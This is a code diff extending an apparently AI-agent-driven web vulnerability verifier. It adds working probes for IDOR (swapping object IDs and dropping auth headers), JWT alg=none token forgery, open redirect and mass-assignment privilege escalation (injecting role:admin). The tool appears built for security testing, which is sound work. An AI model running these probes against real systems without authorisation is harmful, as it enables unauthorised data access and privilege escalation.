@@ -39,12 +39,13 @@ export function createVerifierTool(runtime: ToolRuntime): ToolDefinition<any> {
   return {
     name: "verifier",
     label: "Verifier",
-    description: "Run deterministic verification helpers for common web vulnerability classes. Supported classes: command-injection, file-inclusion, sql-injection, xss-reflected, xss-stored, blind-sql-injection, weak-session-id, file-upload, csrf, brute-force, javascript-logic.",
+    description: "Run deterministic verification helpers for common web vulnerability classes. Supported classes: command-injection, file-inclusion, path-traversal, sql-injection, xss-reflected, xss-stored, blind-sql-injection, weak-session-id, file-upload, csrf, brute-force, javascript-logic, idor, jwt-alg-none, open-redirect, mass-assignment.",
     promptSnippet: "Run a deterministic vulnerability verifier",
     promptGuidelines: [
       "Use verifier after discovering a plausible endpoint/parameter to avoid ad hoc incomplete checks.",
       "Treat verifier confirmed=true as evidence for finding(confirm); treat confirmed=false as a negative or inconclusive coverage result with notes.",
       "For state-changing verifiers, use harmless payloads and restore state when needed.",
+      "After recon, batch verifier across coverage(priority_candidates) including idor/jwt-alg-none/open-redirect/path-traversal/mass-assignment when surface shape suggests them.",
     ],
     parameters: Type.Object({
       vuln_class: Type.String(),
@@ -79,6 +80,10 @@ export function createVerifierTool(runtime: ToolRuntime): ToolDefinition<any> {
       failure_pattern: Type.Optional(Type.String()),
       expected_value: Type.Optional(Type.String()),
       fields: Type.Optional(Type.Record(Type.String(), Type.String())),
+      object_id: Type.Optional(Type.String()),
+      alt_object_id: Type.Optional(Type.String()),
+      jwt: Type.Optional(Type.String()),
+      privileged_fields: Type.Optional(Type.Record(Type.String(), Type.String())),
     }),
     async execute(_toolCallId: string, params: any) {
       const url = resolveTargetUrl(runtime, params.url);
@@ -123,7 +128,7 @@ async function runVerifier(
   proxyUrl?: string,
 ): Promise<VerifyResult> {
   if (vulnClass === "command-injection") return verifyCommandInjection(url, params, headers, proxyUrl);
-  if (vulnClass === "file-inclusion") return verifyFileInclusion(url, params, headers, proxyUrl);
+  if (vulnClass === "file-inclusion" || vulnClass === "path-traversal") return verifyFileInclusion(url, params, headers, proxyUrl);
   if (vulnClass === "sql-injection") return verifySqlInjection(url, params, headers, proxyUrl);
   if (vulnClass === "xss-reflected") return verifyReflectedXss(url, params, headers, proxyUrl);
   if (vulnClass === "xss-stored") return verifyStoredXss(url, params, headers, proxyUrl);
@@ -133,11 +138,257 @@ async function runVerifier(
   if (vulnClass === "csrf") return verifyCsrf(url, params, headers, proxyUrl);
   if (vulnClass === "brute-force") return verifyBruteForce(url, params, headers, proxyUrl);
   if (vulnClass === "javascript-logic") return verifyJavascriptLogic(url, params, headers, proxyUrl);
+  if (vulnClass === "idor") return verifyIdor(url, params, headers, proxyUrl);
+  if (vulnClass === "jwt-alg-none") return verifyJwtAlgNone(url, params, headers, proxyUrl);
+  if (vulnClass === "open-redirect") return verifyOpenRedirect(url, params, headers, proxyUrl);
+  if (vulnClass === "mass-assignment") return verifyMassAssignment(url, params, headers, proxyUrl);
   return {
     confirmed: false,
     reason: `unsupported verifier class: ${vulnClass}`,
     requests: [],
   };
+}
+
+async function verifyIdor(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
+  const method = (params.method || "GET").toUpperCase();
+  const baselineId = String(params.object_id || params.baseline_payload || extractObjectId(url) || "1");
+  const altId = String(params.alt_object_id || params.payload || neighborId(baselineId));
+  const baselineUrl = replaceObjectId(url, baselineId);
+  const attackUrl = replaceObjectId(url, altId);
+  const baseline = await sendProbe(method, baselineUrl, headers, params.body, proxyUrl);
+  // Unauthenticated or cross-object probe: drop auth if requested, else same headers with alt id.
+  const unauthHeaders = { ...headers };
+  if (params.drop_auth !== false) {
+    delete unauthHeaders.authorization;
+    delete unauthHeaders.Authorization;
+    delete unauthHeaders.cookie;
+    delete unauthHeaders.Cookie;
+  }
+  const attack = await sendProbe(method, attackUrl, params.keep_auth ? headers : unauthHeaders, params.body, proxyUrl);
+  const sensitive = /email|password|token|admin|role|address|card|phone|hash/i.test(attack.body);
+  const authorizedShape = baseline.status < 400 && attack.status < 400;
+  const differentObject = meaningfulDifference(baseline.body, attack.body) || baselineUrl !== attackUrl;
+  const confirmed = authorizedShape && differentObject && (sensitive || attack.body.length > 20);
+  return {
+    confirmed,
+    reason: confirmed
+      ? "alternate object identifier returned accessible data without matching ownership controls"
+      : "alternate object identifier did not prove unauthorized data access",
+    requests: [
+      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline-object" },
+      { method: attack.method, url: attack.url, status: attack.status, marker: confirmed ? "cross-object-access" : undefined },
+    ],
+    details: {
+      baseline_id: baselineId,
+      alt_id: altId,
+      sensitive_fields_hint: sensitive,
+      baseline_length: baseline.body.length,
+      attack_length: attack.body.length,
+      attack_excerpt: attack.body.slice(0, 500),
+      probes: [probeDetails(baseline, "baseline"), probeDetails(attack, "attack")],
+    },
+  };
+}
+
+async function verifyJwtAlgNone(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
+  const baseline = await sendProbe(params.method || "GET", url, headers, params.body, proxyUrl);
+  const sourceJwt = String(params.jwt || params.token_value || extractBearer(headers) || "");
+  if (!sourceJwt || sourceJwt.split(".").length < 2) {
+    return {
+      confirmed: false,
+      reason: "no JWT/bearer token available to mutate for alg=none probe",
+      requests: [{ method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" }],
+      details: { probes: [probeDetails(baseline, "baseline")] },
+    };
+  }
+  const forged = forgeUnsignedJwt(sourceJwt, params.payload);
+  const attackHeaders: Record<string, string> = { ...headers, authorization: `Bearer ${forged}` };
+  delete attackHeaders.Authorization;
+  const attack = await sendProbe(params.method || "GET", url, attackHeaders, params.body, proxyUrl);
+  const baselineDenied = baseline.status === 401 || baseline.status === 403 || /unauthorized|unauthenticated|invalid token|jwt/i.test(baseline.body);
+  const attackAccepted = attack.status > 0 && attack.status < 400 && !/invalid token|jwt malformed|unauthorized/i.test(attack.body);
+  // Also compare privileged marker presence when baseline was unauthenticated.
+  const confirmed = attackAccepted && (baselineDenied || meaningfulDifference(baseline.body, attack.body));
+  return {
+    confirmed,
+    reason: confirmed
+      ? "server accepted an unsigned/alg=none JWT style token for a protected endpoint"
+      : "unsigned/alg=none JWT probe did not prove acceptance",
+    requests: [
+      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
+      { method: attack.method, url: attack.url, status: attack.status, marker: confirmed ? "alg-none-accepted" : undefined },
+    ],
+    details: {
+      forged_token_preview: `${forged.slice(0, 48)}...`,
+      baseline_status: baseline.status,
+      attack_status: attack.status,
+      attack_excerpt: attack.body.slice(0, 500),
+      probes: [probeDetails(baseline, "baseline"), probeDetails(attack, "attack")],
+    },
+  };
+}
+
+async function verifyOpenRedirect(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
+  const param = params.param || "to" ;
+  const external = params.payload || "https://example.com/node2-open-redirect";
+  const baseline = await requestWithParam(url, params.method || "GET", param, params.baseline_payload || "/", headers, proxyUrl);
+  const attack = await requestWithParam(url, params.method || "GET", param, external, headers, proxyUrl);
+  const location = attack.headers.location || attack.headers.Location || "";
+  const bodyRedirect = /location\.href\s*=\s*["']https?:\/\/example\.com|meta http-equiv=["']refresh["'][^>]+example\.com/i.test(attack.body);
+  const confirmed = /example\.com/i.test(location) || bodyRedirect;
+  return {
+    confirmed,
+    reason: confirmed
+      ? "external absolute URL was accepted in a redirect/navigation sink"
+      : "redirect parameter did not navigate to an external absolute URL",
+    requests: [
+      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
+      { method: attack.method, url: attack.url, status: attack.status, marker: confirmed ? location || "body-redirect" : undefined },
+    ],
+    details: {
+      param,
+      external,
+      location,
+      body_redirect: bodyRedirect,
+      probes: [probeDetails(baseline, "baseline"), probeDetails(attack, "attack")],
+    },
+  };
+}
+
+async function verifyMassAssignment(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
+  const method = (params.method || "POST").toUpperCase();
+  const privilegedFields = { ...(params.privileged_fields || { role: "admin" }) };
+  const baseFields = { ...(params.fields || {}) };
+  if (!Object.keys(baseFields).length) {
+    baseFields.email = params.username || `node2-${Date.now()}@example.com`;
+    baseFields.password = params.password || "Node2Pass!23";
+    baseFields.passwordRepeat = baseFields.password;
+  }
+  // Never send privileged fields on the baseline create/update — agents sometimes put role/admin in `fields`.
+  for (const key of Object.keys(privilegedFields)) {
+    delete baseFields[key];
+  }
+  // Unique identities so the attack is not rejected as "email already exists" after a successful baseline.
+  const stamp = `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  if (baseFields.email || privilegedFields.email) {
+    baseFields.email = `node2_base_${stamp}@example.com`;
+  }
+  if (baseFields.username || privilegedFields.username) {
+    baseFields.username = `node2_base_${stamp}`;
+  }
+  const privileged = {
+    ...baseFields,
+    ...privilegedFields,
+  };
+  if (privileged.email) privileged.email = `node2_priv_${stamp}@example.com`;
+  if (privileged.username) privileged.username = `node2_priv_${stamp}`;
+
+  // API-style endpoints commonly expect JSON create/update bodies.
+  const useJson = /\/api\/|\/rest\/|application\/json/i.test(`${url} ${headers["content-type"] || headers["Content-Type"] || ""}`);
+  const baseline = useJson
+    ? await sendJson(url, method, baseFields, headers, proxyUrl)
+    : await requestWithFields(url, method, baseFields, headers, proxyUrl);
+  const attack = useJson
+    ? await sendJson(url, method, privileged, headers, proxyUrl)
+    : await requestWithFields(url, method, privileged, headers, proxyUrl);
+  const privilegeHint = /"role"\s*:\s*"admin"|"isAdmin"\s*:\s*true|"admin"\s*:\s*true/i.test(attack.body);
+  const baselinePrivilege = /"role"\s*:\s*"admin"|"isAdmin"\s*:\s*true|"admin"\s*:\s*true/i.test(baseline.body);
+  const accepted = attack.status > 0 && attack.status < 400;
+  // Prefer attack that elevates beyond a non-privileged baseline; still confirm if attack alone proves privilege.
+  const confirmed = accepted && privilegeHint && !baselinePrivilege;
+  return {
+    confirmed,
+    reason: confirmed
+      ? "create/update accepted privileged fields and response indicates elevated role/privilege"
+      : "privileged field injection did not prove mass assignment",
+    requests: [
+      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
+      { method: attack.method, url: attack.url, status: attack.status, marker: confirmed ? "privileged-fields-accepted" : undefined },
+    ],
+    details: {
+      privileged_fields: Object.keys(privilegedFields),
+      attack_excerpt: attack.body.slice(0, 500),
+      probes: [probeDetails(baseline, "baseline"), probeDetails(attack, "attack")],
+    },
+  };
+}
+
+async function sendJson(
+  url: string,
+  method: string,
+  fields: Record<string, string>,
+  headers: Record<string, string>,
+  proxyUrl?: string,
+): Promise<HttpProbe> {
+  const body = JSON.stringify(fields);
+  const requestHeaders = { "content-type": "application/json", ...headers };
+  const response = await sendHttpTracked({ method, url, headers: requestHeaders, body, proxyUrl });
+  return { method, url, status: response.status, headers: response.headers, body: response.body, requestHeaders, requestBody: body };
+}
+
+function extractObjectId(rawUrl: string): string | undefined {
+  try {
+    const url = new URL(rawUrl);
+    for (const key of ["id", "userId", "basketId", "orderId"]) {
+      if (url.searchParams.get(key)) return url.searchParams.get(key) || undefined;
+    }
+    const match = url.pathname.match(/\/(\d+)(?:\/|$)/);
+    return match?.[1];
+  } catch {
+    return undefined;
+  }
+}
+
+function neighborId(value: string): string {
+  if (/^\d+$/.test(value)) return String(Math.max(1, Number(value) + 1));
+  return `${value}-2`;
+}
+
+function replaceObjectId(rawUrl: string, objectId: string): string {
+  try {
+    const url = new URL(rawUrl);
+    for (const key of ["id", "userId", "basketId", "orderId"]) {
+      if (url.searchParams.has(key)) {
+        url.searchParams.set(key, objectId);
+        return url.toString();
+      }
+    }
+    if (/\/\d+(?:\/|$)/.test(url.pathname)) {
+      url.pathname = url.pathname.replace(/\/\d+(?=\/|$)/, `/${objectId}`);
+      return url.toString();
+    }
+    url.searchParams.set("id", objectId);
+    return url.toString();
+  } catch {
+    return rawUrl;
+  }
+}
+
+function extractBearer(headers: Record<string, string>): string | undefined {
+  const auth = headers.authorization || headers.Authorization || "";
+  const match = /Bearer\s+(\S+)/i.exec(auth);
+  return match?.[1];
+}
+
+function forgeUnsignedJwt(sourceJwt: string, payloadOverride?: string): string {
+  const parts = sourceJwt.split(".");
+  const payloadB64 = parts[1] || Buffer.from(payloadOverride || '{"sub":"node2"}', "utf8").toString("base64url");
+  let payload = payloadB64;
+  if (payloadOverride) {
+    payload = Buffer.from(payloadOverride, "utf8").toString("base64url");
+  } else {
+    try {
+      const json = JSON.parse(Buffer.from(payloadB64, "base64url").toString("utf8"));
+      if (json && typeof json === "object") {
+        json.sub = json.sub || "node2-alg-none";
+        payload = Buffer.from(JSON.stringify(json), "utf8").toString("base64url");
+      }
+    } catch {
+      // keep original payload segment
+    }
+  }
+  const header = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" }), "utf8").toString("base64url");
+  return `${header}.${payload}.`;
 }
 
 async function verifyCommandInjection(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
@@ -704,7 +955,7 @@ async function markVerified(runtime: ToolRuntime, rawUrl: string, param: string,
 
 function defaultParam(vulnClass: string): string {
   if (vulnClass === "command-injection") return "ip";
-  if (vulnClass === "file-inclusion") return "page";
+  if (vulnClass === "file-inclusion" || vulnClass === "path-traversal") return "page";
   if (vulnClass === "sql-injection") return "id";
   if (vulnClass === "xss-reflected") return "name";
   if (vulnClass === "xss-stored") return "txtName,mtxMessage";
@@ -714,6 +965,10 @@ function defaultParam(vulnClass: string): string {
   if (vulnClass === "csrf") return "csrf_token";
   if (vulnClass === "brute-force") return "username,password";
   if (vulnClass === "javascript-logic") return "token";
+  if (vulnClass === "idor") return "id";
+  if (vulnClass === "jwt-alg-none") return "authorization";
+  if (vulnClass === "open-redirect") return "to";
+  if (vulnClass === "mass-assignment") return "role";
   return "-";
 }
 
